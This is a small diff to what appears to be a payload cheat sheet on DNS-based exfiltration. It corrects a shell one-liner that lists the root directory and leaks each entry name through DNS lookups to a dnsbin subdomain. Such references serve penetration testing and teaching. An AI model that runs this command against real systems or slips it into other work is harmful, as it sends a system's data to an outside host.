@@ -187,7 +187,7 @@ Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbi
 ```powershell
 1. Go to http://dnsbin.zhack.ca/
 2. Execute a simple 'ls'
-for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
+for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
 ```powershell
